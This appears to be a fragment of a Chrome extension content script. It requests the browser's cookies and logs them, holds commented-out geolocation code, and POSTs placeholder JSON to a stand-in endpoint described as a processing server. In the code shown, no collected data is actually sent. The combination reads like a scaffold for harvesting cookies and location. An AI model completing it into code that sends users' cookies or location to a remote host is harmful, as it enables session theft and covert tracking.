chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
    console.log(response.cookies);
  });


// GEOLOCATION

//if ("geolocation" in navigator) {
  // Geolocation is supported, request location
  //navigator.geolocation.getCurrentPosition(function(position) {
  //  console.log("Latitude: " + position.coords.latitude);
    //console.log("Longitude: " + position.coords.longitude);
//  }, function(error) {
  //  console.error("Error occurred. Error code: " + error.code);
    // error.code can be:
    //   0: unknown error
    //   1: permission denied
    //   2: position unavailable (error response from location provider)
    //   3: timed out
//  });
//} else {
  // Geolocation is not supported by this browser
//  console.log("Geolocation is not supported by your browser");
//}


// Send data to the the processing server

fetch('https://your-endpoint.com/post', {
  method: 'POST', // Specify the method
  headers: {
    // Headers you want to send
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    // Your POST data
    key: 'value',
    anotherKey: 'anotherValue'
  })
})
.then(response => response.json()) // Parsing the JSON response
.then(data => console.log(data)) // Handling the data from the response
.catch(error => console.error('Error:', error)); // Handling errors